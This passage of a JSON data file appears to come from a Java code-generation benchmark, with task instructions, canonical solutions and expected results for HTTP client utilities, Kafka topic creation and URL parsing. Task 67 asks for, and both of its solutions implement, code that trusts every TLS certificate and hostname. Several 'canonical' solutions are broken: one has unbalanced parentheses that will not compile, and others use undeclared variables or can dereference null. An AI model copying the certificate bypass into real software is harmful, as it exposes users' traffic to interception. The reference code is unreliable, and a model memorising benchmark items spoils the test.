{\n                    Log.e(\"HttpRequestHandler\", \"Unexpected status: \" + status);\n                }\n            } catch (Exception e) {\n                Log.e(\"HttpRequestHandler\", \"onProgressUpdate JSON parsing error\", e);\n            }\n        }\n\n        private void initiateLogin(JSONObject user) {\n            // Placeholder for initiating login flow\n        }\n    }\n\n    private Context getApplicationContext() {\n        // This method should be implemented to provide the Android context\n        return null;\n    }\n}\n```"
  },
  {
    "Task_id": 67,
    "Instruction": "Task Description: Create a Java utility class for making HTTP POST requests with JSON payloads, handling both HTTP and HTTPS connections, including SSL certificate verification bypass for HTTPS, and processing JSON responses.\n\nClass Description: XxlJobRemotingUtil is a utility class designed to handle remote HTTP communication with JSON payloads, particularly for interacting with the XXL-JOB scheduler. It provides methods for making POST requests with proper headers, timeout settings, and access token authentication.\n\nAttributes:\n- logger: Logger - SLF4J logger for error and debug logging\n- XXL_JOB_ACCESS_TOKEN: String - Constant string for the access token header name\n- trustAllCerts: TrustManager[] - Array of trust managers that don't validate certificates\n\nMethods:\n- trustAllHosts(HttpsURLConnection connection) -> void - Configures the HTTPS connection to trust all hosts and certificates\n- postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) -> ReturnT - Makes an HTTP POST request with JSON payload and processes the JSON response\n\nMethod Details:\n1. trustAllHosts(HttpsURLConnection connection) -> void\n   - Input: HttpsURLConnection connection - The HTTPS connection to configure\n   - Description: Sets up SSL context to trust all certificates and hosts for the given HTTPS connection\n\n2. postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) -> ReturnT\n   - Input:\n     - url: String - The target URL for the POST request\n     - accessToken: String - Authentication token for the request\n     - timeout: int - Read timeout in seconds\n     - requestObj: Object - The object to be serialized as JSON request body\n     - returnTargClassOfT: Class - The class type for deserializing the response\n   - Output: ReturnT - A generic return type containing either the successful response or error information\n   - Description: \n     1. Creates and configures an HTTP/HTTPS connection\n     2. Sets request headers including content type and access token\n     3. Serializes the request object to JSON and sends it\n     4. Reads and deserializes the JSON response\n     5. Handles errors and connection cleanup",
    "Canonical_solution": "import com.xxl.job.core.biz.model.ReturnT;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.net.ssl.*;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\n\npublic class XxlJobRemotingUtil {\n    private static Logger logger = LoggerFactory.getLogger(XxlJobRemotingUtil.class);\n    public static final String XXL_JOB_ACCESS_TOKEN = \"XXL-JOB-ACCESS-TOKEN\";\n\n    private static final TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[]{};\n        }\n        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    }};\n\n    private static void trustAllHosts(HttpsURLConnection connection) {\n        try {\n            SSLContext sc = SSLContext.getInstance(\"TLS\");\n            sc.init(null, trustAllCerts, new java.security.SecureRandom());\n            SSLSocketFactory newFactory = sc.getSocketFactory();\n            connection.setSSLSocketFactory(newFactory);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        }\n        connection.setHostnameVerifier(new HostnameVerifier() {\n            public boolean verify(String hostname, SSLSession session) {\n                return true;\n            }\n        });\n    }\n\n    public static ReturnT postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) {\n        HttpURLConnection connection = null;\n        BufferedReader bufferedReader = null;\n        try {\n            URL realUrl = new URL(url);\n            connection = (HttpURLConnection) realUrl.openConnection();\n\n            boolean useHttps = url.startsWith(\"https\");\n            if (useHttps) {\n                HttpsURLConnection https = (HttpsURLConnection) connection;\n                trustAllHosts(https);\n            }\n\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setReadTimeout(timeout * 1000);\n            connection.setConnectTimeout(3 * 1000);\n            connection.setRequestProperty(\"connection\", \"Keep-Alive\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json;charset=UTF-8\");\n            connection.setRequestProperty(\"Accept-Charset\", \"application/json;charset=UTF-8\");\n\n            if(accessToken!=null && accessToken.trim().length()>0){\n                connection.setRequestProperty(XXL_JOB_ACCESS_TOKEN, accessToken);\n            }\n\n            connection.connect();\n\n            if (requestObj != null) {\n                String requestBody = GsonTool.toJson(requestObj);\n                DataOutputStream dataOutputStream = new DataOutputStream(connection.getOutputStream());\n                dataOutputStream.write(requestBody.getBytes(\"UTF-8\"));\n                dataOutputStream.flush();\n                dataOutputStream.close();\n            }\n\n            int statusCode = connection.getResponseCode();\n            if (statusCode != 200) {\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting fail, StatusCode(\"+ statusCode +\") invalid. for url : \" + url);\n            }\n\n            bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n            StringBuilder result = new StringBuilder();\n            String line;\n            while ((line = bufferedReader.readLine()) != null) {\n                result.append(line);\n            }\n            String resultJson = result.toString();\n\n            try {\n                ReturnT returnT = GsonTool.fromJson(resultJson, ReturnT.class, returnTargClassOfT);\n                return returnT;\n            } catch (Exception e) {\n                logger.error(\"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\", e);\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\");\n            }\n\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n            return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting error(\"+ e.getMessage() +\"), for url : \" + url);\n        } finally {\n            try {\n                if (bufferedReader != null) {\n                    bufferedReader.close();\n                }\n                if (connection != null) {\n                    connection.disconnect();\n                }\n            } catch (Exception e2) {\n                logger.error(e2.getMessage(), e2);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.lang.reflect.Type;\nimport java.net.*;\nimport java.security.cert.X509Certificate;\nimport org.slf4j.Logger;\nimport com.google.gson.Gson;\nimport com.google.gson.reflect.TypeToken;\n\npublic class XxlJobRemotingUtil {\n\n    private static final Logger logger = org.slf4j.LoggerFactory.getLogger(XxlJobRemotingUtil.class);\n    public static final String XXL_JOB_ACCESS_TOKEN = \"XXL-JOB-ACCESS-TOKEN\";\n    private static final TrustManager[] trustAllCerts = new TrustManager[]{\n        new X509TrustManager() {\n            public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n            public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n        }\n    };\n\n    private static void trustAllHosts(HttpsURLConnection connection) {\n        try {\n            SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());\n            SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();\n            connection.setSSLSocketFactory(sslSocketFactory);\n            connection.setHostnameVerifier((hostname, session) -> true);\n        } catch (Exception e) {\n            logger.error(\"Failed to set up trust all hosts\", e);\n        }\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    public static <ReturnT> ReturnT postBody(String url, String accessToken, int timeout, Object requestObj, Class<ReturnT> returnTargClassOfT) {\n        HttpURLConnection connection = null;\n        OutputStream outputStream = null;\n        InputStream inputStream = null;\n        BufferedReader reader = null;\n        Gson gson = new Gson();\n\n        try {\n            URL requestUrl = new URL(url);\n            connection = (HttpURLConnection) requestUrl.openConnection();\n\n            if (connection instanceof HttpsURLConnection) {\n                trustAllHosts((HttpsURLConnection) connection);\n            }\n\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setRequestProperty(\"Content-Type\", \"application/json; charset=UTF-8\");\n            if (accessToken != null && !accessToken.isEmpty()) {\n                connection.setRequestProperty(XXL_JOB_ACCESS_TOKEN, accessToken);\n            }\n            connection.setConnectTimeout(timeout * 1000);\n            connection.setReadTimeout(timeout * 1000);\n\n            outputStream = connection.getOutputStream();\n            outputStream.write(gson.toJson(requestObj).getBytes(\"UTF-8\"));\n            outputStream.flush();\n\n            inputStream = connection.getInputStream();\n            reader = new BufferedReader(new InputStreamReader(inputStream));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n\n            Type responseType = new TypeToken<ReturnT>() {}.getType();\n            return gson.fromJson(response.toString(), responseType);\n        } catch (Exception e) {\n            logger.error(\"HTTP POST request failed\", e);\n            return null;\n        } finally {\n            try {\n                if (outputStream != null) outputStream.close();\n                if (inputStream != null) inputStream.close();\n                if (reader != null) reader.close();\n                if (connection != null) connection.disconnect();\n            } catch (IOException e) {\n                logger.warn(\"Error during stream or connection cleanup\", e);\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 68,
    "Instruction": "Task Description: Create a utility class for making HTTP POST requests with configurable timeouts and form data submission capabilities.\n\nClass Description: TinyIdHttpUtils is a utility class that provides static methods for performing HTTP POST requests. It handles connection management, timeout configuration, form data encoding, and response reading. The class is designed to be thread-safe and includes proper resource cleanup.\n\nAttributes:\n- logger: Logger - Used for logging errors and warnings during HTTP operations\n\nMethods:\n- post(String url, Integer readTimeout, Integer connectTimeout) -> String - Makes a POST request to the specified URL with given timeout values\n- post(String url, Map<String,String> form, Integer readTimeout, Integer connectTimeout) -> String - Makes a POST request with form data to the specified URL with given timeout values",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class TinyIdHttpUtils {\n\n    private static final Logger logger = Logger.getLogger(TinyIdHttpUtils.class.getName());\n\n    private TinyIdHttpUtils() {\n    }\n\n    public static String post(String url, Integer readTimeout, Integer connectTimeout) {\n        return post(url, null, readTimeout, connectTimeout);\n    }\n\n    public static String post(String url, Map<String, String> form, Integer readTimeout, Integer connectTimeout) {\n        HttpURLConnection conn = null;\n        OutputStreamWriter os = null;\n        BufferedReader rd = null;\n        StringBuilder param = new StringBuilder();\n        StringBuilder sb = new StringBuilder();\n        String line = null;\n        String response = null;\n        if (form != null) {\n            for (Map.Entry<String, String> entry : form.entrySet()) {\n                String key = entry.getKey();\n                if (param.length() != 0) {\n                    param.append(\"&\");\n                }\n                param.append(key).append(\"=\").append(entry.getValue());\n            }\n        }\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            conn.setReadTimeout(readTimeout);\n            conn.setConnectTimeout(connectTimeout);\n            conn.setUseCaches(false);\n            conn.connect();\n            os = new OutputStreamWriter(conn.getOutputStream(), \"UTF-8\");\n            os.write(param.toString());\n            os.flush();\n            rd = new BufferedReader(new InputStreamReader(conn.getInputStream(), \"UTF-8\"));\n            while ((line = rd.readLine()) != null) {\n                sb.append(line);\n            }\n            response = sb.toString();\n        } catch (Exception e) {\n            logger.log(Level.SEVERE, \"error post url:\" + url + param, e);\n        } finally {\n            try {\n                if (os != null) {\n                    os.close();\n                }\n                if (rd != null) {\n                    rd.close();\n                }\n                if (conn != null) {\n                    conn.disconnect();\n                }\n            } catch (IOException e) {\n                logger.log(Level.WARNING, \"error close conn\", e);\n            }\n        }\n        return response;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class TinyIdHttpUtils {\n    private static final Logger logger = LoggerFactory.getLogger(TinyIdHttpUtils.class);\n\n    public static String post(String url, Integer readTimeout, Integer connectTimeout) {\n        return post(url, null, readTimeout, connectTimeout);\n    }\n\n    public static String post(String url, Map<String, String> form, Integer readTimeout, Integer connectTimeout) {\n        StringBuilder result = new StringBuilder();\n        HttpURLConnection connection = null;\n        try {\n            URL requestUrl = new URL(url);\n            connection = (HttpURLConnection) requestUrl.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setConnectTimeout(connectTimeout != null ? connectTimeout : 5000);\n            connection.setReadTimeout(readTimeout != null ? readTimeout : 5000);\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n            if (form != null && !form.isEmpty()) {\n                StringBuilder formData = new StringBuilder();\n                for (Map.Entry<String, String> entry : form.entrySet()) {\n                    if (formData.length() > 0)\n                        formData.append(\"&\");\n                    formData.append(entry.getKey()).append(\"=\").append(java.net.URLEncoder.encode(entry.getValue(), \"UTF-8\"));\n                }\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = formData.toString().getBytes(\"utf-8\");\n                    os.write(input, 0, input.length);\n                }\n            }\n\n            int responseCode = connection.getResponseCode();\n            BufferedReader reader;\n            if (responseCode >= 200 && responseCode < 300) {\n                reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            } else {\n                reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));\n            }\n\n            String line;\n            while ((line = reader.readLine()) != null) {\n                result.append(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            logger.error(\"Error during HTTP POST request to \" + url, e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return result.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 7,
    "Instruction": "Task Description: Create a Kafka topic using the AdminClient API in Java, specifying topic configuration such as name, partitions, replication factor, and retention time.\n\nFunction Description: This function creates a new Kafka topic with the specified configuration using the Kafka AdminClient. It handles the creation process, including setting up the AdminClient, defining the topic properties, and executing the topic creation while managing exceptions and resource cleanup.\n\nInput:\n- kafkaClientInfo: [KafkaClientInfo] - Contains connection and configuration details for the Kafka broker\n- newTopicInfo: [NewTopicInfo] - Contains the topic configuration including name, partitions, replication factor, and retention time in milliseconds\n\nOutput:\n- [boolean] - Returns true if the topic was successfully created, false if an error occurred",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.common.config.TopicConfig;\n\nprivate final KafkaStoragePlugin plugin;\n\npublic boolean createTopicName(KafkaClientInfo kafkaClientInfo, NewTopicInfo newTopicInfo) {\n    boolean status = false;\n    AdminClient adminClient = null;\n    try {\n        adminClient = AdminClient.create(plugin.getKafkaAdminClientProps(kafkaClientInfo));\n        NewTopic newTopic = new NewTopic(newTopicInfo.getTopicName(), newTopicInfo.getPartitions(), newTopicInfo.getReplication());\n        newTopic.configs(Collections.singletonMap(TopicConfig.RETENTION_MS_CONFIG, String.valueOf(newTopicInfo.getRetainMs())));\n        adminClient.createTopics(Collections.singleton(newTopic)).all().get();\n        status = true;\n    } catch (Exception e) {\n        status = false;\n        log.error(\"Create kafka topic has error, new topic [{}], msg is {}\", newTopicInfo, e);\n    } finally {\n        adminClient.close();\n    }\n    return status;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 34,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.common.config.TopicConfig;\n\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\n\npublic class KafkaTopicCreator {\n\n    public boolean createKafkaTopic(KafkaClientInfo kafkaClientInfo, NewTopicInfo newTopicInfo) {\n        Properties props = new Properties();\n        props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaClientInfo.getBootstrapServers());\n\n        try (AdminClient adminClient = AdminClient.create(props)) {\n            Map<String, String> configs = new HashMap<>();\n            configs.put(TopicConfig.RETENTION_MS_CONFIG, String.valueOf(newTopicInfo.getRetentionTimeMs()));\n\n            NewTopic newTopic = new NewTopic(\n                    newTopicInfo.getName(),\n                    newTopicInfo.getNumPartitions(),\n                    newTopicInfo.getReplicationFactor()\n            ).configs(configs);\n\n            adminClient.createTopics(Collections.singletonList(newTopic)).all().get();\n            return true;\n        } catch (InterruptedException | ExecutionException e) {\n            Thread.currentThread().interrupt();\n            return false;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 70,
    "Instruction": "Task Description: Create a function that performs an HTTP GET request to a specified URL and returns the response as a string.\n\nFunction Description: The function should establish an HTTP connection to the provided URL, send a GET request, read the response from the input stream, and return it as a UTF-8 encoded string. Proper error handling and resource cleanup should be implemented.\n\nInput: \n- requestUrl: String - The URL to which the HTTP GET request will be sent.\n\nOutput: \n- String - The response from the HTTP GET request, or null if an error occurs.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate static String httpRequest(String requestUrl) {\n    StringBuffer buffer = null;\n    BufferedReader bufferedReader = null;\n    InputStreamReader inputStreamReader = null;\n    InputStream inputStream = null;\n    HttpURLConnection httpUrlConn = null;\n    try {\n        // \u5efa\u7acbget\u8bf7\u6c42\n        URL url = new URL(requestUrl);\n        httpUrlConn = (HttpURLConnection) url.openConnection();\n        httpUrlConn.setDoInput(true);\n        httpUrlConn.setRequestMethod(\"GET\");\n        // \u83b7\u53d6\u8f93\u5165\u6d41\n        inputStream = httpUrlConn.getInputStream();\n        inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        bufferedReader = new BufferedReader(inputStreamReader);\n        // \u4ece\u8f93\u5165\u6d41\u83b7\u53d6\u7ed3\u679c\n        buffer = new StringBuffer();\n        String str = null;\n        while ((str = bufferedReader.readLine()) != null) {\n            str = new String(str.getBytes(), \"UTF-8\");\n            buffer.append(str);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        if (bufferedReader != null) {\n            try {\n                bufferedReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStreamReader != null) {\n            try {\n                inputStreamReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (httpUrlConn != null) {\n            httpUrlConn.disconnect();\n        }\n    }\n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpGetExample {\n\n    public static String performGetRequest(String requestUrl) {\n        StringBuilder response = new StringBuilder();\n        try {\n            URL url = new URL(requestUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n            } else {\n                return null;\n            }\n            connection.disconnect();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n        return response.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 71,
    "Instruction": "Task Description: Create a Java utility class for making asynchronous HTTP requests using HttpURLConnection, supporting both GET and POST methods with configurable headers and parameters. The class should handle response processing and error handling through callbacks.\n\nClass Description: HttpURLConnectionUtils is a final utility class that provides static methods for performing asynchronous HTTP requests. It encapsulates the complexity of HttpURLConnection and provides a simple callback-based interface for handling responses and errors.\n\nAttributes:\n\nTIMEOUT_IN_MILLIONS: int - The connection and read timeout duration in milliseconds (default: 5000)\n\nMethods:\n\ndoGetAsync(String urlStr, Callback callback) -> void - Performs an asynchronous HTTP GET request to the specified URL and invokes the callback with the response or error.\n\ndoPostAsync(String urlStr, String params, Callback callback) -> void - Performs an asynchronous HTTP POST request to the specified URL with the given parameters and invokes the callback with the response or error.\n\nrequest(String method, String urlStr, Map<String,String> headers, String params, Callback callback) -> void - Internal method that handles the actual HTTP request logic for both GET and POST methods, including setting headers, writing parameters, and processing the response.\n\nCallback: interface - Defines two methods for handling request outcomes:\n  onResponse(String result, long response) -> void - Called when the request succeeds\n  onFail(Throwable error) -> void - Called when the request fails",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(\n            final String urlStr,\n            final Callback callback\n    ) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void doPostAsync(\n            final String urlStr,\n            final String params,\n            final Callback callback\n    ) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void request(\n            final String method,\n            final String urlStr,\n            final Map<String, String> headers,\n            final String params,\n            final Callback callback\n    ) {\n        HttpURLConnection connection = null;\n        InputStream is = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n\n            if (params != null && params.length() != 0) {\n                connection.setDoInput(true);\n                connection.setDoOutput(true);\n                connection.setUseCaches(false);\n                OutputStream os = connection.getOutputStream();\n                os.write(params.getBytes());\n                os.flush();\n                os.close();\n            }\n\n            connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n            connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                is = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[1024];\n                int len;\n                while (((len = is.read(buffer)) != -1) {\n                    baos.write(buffer, 0, len);\n                }\n                String result = baos.toString();\n                if (callback != null) {\n                    callback.onResponse(result, connection.getDate());\n                }\n            } else {\n                if (callback != null) {\n                    callback.onFail(new Exception(\"responseCode not >= 200 or < 300, code: \" + responseCode));\n                }\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            try {\n                if (baos != null) baos.close();\n                if (is != null) is.close();\n            } catch (Exception ignore) {}\n            \n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n    public static final int TIMEOUT_IN_MILLIONS = 5000;\n\n    public interface Callback {\n        void onResponse(String result, int responseCode);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(String urlStr, Callback callback) {\n        new Thread(() -> request(\"GET\", urlStr, null, null, callback)).start();\n    }\n\n    public static void doPostAsync(String urlStr, String params, Callback callback) {\n        new Thread(() -> request(\"POST\", urlStr, null, params, callback)).start();\n    }\n\n    private static void request(String method, String urlStr, Map<String, String> headers, String params, Callback callback) {\n        HttpURLConnection urlConnection = null;\n        try {\n            URL url = new URL(urlStr);\n            urlConnection = (HttpURLConnection) url.openConnection();\n\n            urlConnection.setRequestMethod(method);\n            urlConnection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n            urlConnection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n            urlConnection.setDoInput(true);\n\n            if (\"POST\".equalsIgnoreCase(method)) {\n                urlConnection.setDoOutput(true);\n                urlConnection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                if (params != null && !params.isEmpty()) {\n                    try (OutputStream os = urlConnection.getOutputStream()) {\n                        os.write(params.getBytes(\"UTF-8\"));\n                    }\n                }\n            }\n\n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    urlConnection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n\n            int responseCode = urlConnection.getResponseCode();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            callback.onResponse(response.toString(), responseCode);\n        } catch (Exception e) {\n            callback.onFail(e);\n        } finally {\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 73,
    "Instruction": "Task Description: Create a Java utility class for handling HTTP requests and URL parameter parsing.\n\nClass Description: HttpUtils is a utility class that provides methods for making HTTP POST requests and parsing URL parameters. It uses Java's HttpURLConnection for HTTP communication and includes helper methods for processing request/response data.\n\nAttributes: (This class has no attributes as it's a utility class with static methods only)\n\nMethods:\n\nMethod1: parseUrlArgs(String responseUrl, JsonObject jsonObject) -> String - Parses a URL string to extract query parameters and adds them to a JsonObject. Returns the base URL without query parameters.\n- Input Parameters:\n  - responseUrl: String - The URL string to parse (may contain query parameters)\n  - jsonObject: JsonObject - The JSON object to populate with parsed parameters\n- Output: String - The base URL without query parameters\n\nMethod2: post(String httpUrl, String content) -> String - Sends an HTTP POST request to the specified URL with the given content and returns the response.\n- Input Parameters:\n  - httpUrl: String - The target URL for the POST request\n  - content: String - The content to send in the request body (can be null or empty)\n- Output: String - The response body from the server\n- Throws: Exception - If the request fails or returns non-200 status code",
    "Canonical_solution": "import com.google.common.io.CharStreams;\nimport com.google.gson.JsonObject;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport org.apache.commons.lang3.StringUtils;\n\npublic class HttpUtils {\n\n    public static String parseUrlArgs(String responseUrl, JsonObject jsonObject) {\n        String[] split1 = responseUrl.split(\"\\\\?\");\n        String url = split1[0];\n        if (split1.length > 1) {\n            String[] split = split1[1].split(\"&\");\n            for (int i = 0; i < split.length; i++) {\n                String[] args = split[i].split(\"=\");\n                jsonObject.addProperty(args[0], args[1]);\n            }\n        }\n        return url;\n    }\n\n    public static String post(String httpUrl, String content) throws Exception {\n        Map<String, String> headers = new HashMap<>(1);\n        headers.put(\"Content-type\", \"application/json\");\n        URL url = new URL(httpUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        if (null != headers && !headers.isEmpty()) {\n            for (Entry<String, String> entry : headers.entrySet()) {\n                conn.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n        if (StringUtils.isNotBlank(content)) {\n            conn.getOutputStream().write(content.getBytes(StandardCharsets.UTF_8));\n        }\n        conn.connect();\n        if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) {\n            throw new RuntimeException(\"request failure, status code:\" + conn.getResponseCode());\n        }\n        String result = CharStreams\n            .toString(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));\n        conn.disconnect();\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.*;\n\nimport com.google.gson.JsonObject;\n\npublic class HttpUtils {\n\n    public static String parseUrlArgs(String responseUrl, JsonObject jsonObject) {\n        if (responseUrl == null || responseUrl.isEmpty()) {\n            return \"\";\n        }\n\n        int queryIndex = responseUrl.indexOf('?');\n        if (queryIndex == -1) {\n            return responseUrl;\n        }\n\n        String baseUrl = responseUrl.substring(0, queryIndex);\n        String queryString = responseUrl.substring(queryIndex + 1);\n\n        Map<String, String> params = new HashMap<>();\n        for (String param : queryString.split(\"&\")) {\n            String[] pair = param.split(\"=\");\n            if (pair.length > 1) {\n                String key = pair[0];\n                String value = pair[1];\n                params.put(key, value);\n                jsonObject.addProperty(key, value);\n            }\n        }\n\n        return baseUrl;\n    }\n\n    public static String post(String httpUrl, String content) throws Exception {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(httpUrl);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setRequestProperty(\"Content-Type\", \"application/json; charset=UTF-8\");\n\n            if (content != null && !content.isEmpty()) {\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = content.getBytes(StandardCharsets.UTF_8);\n                    os.write(input, 0, input.length);\n                }\n            }\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode != HttpURLConnection.HTTP_OK) {\n                throw new IOException(\"HTTP POST request failed with code: \" + responseCode);\n            }\n\n            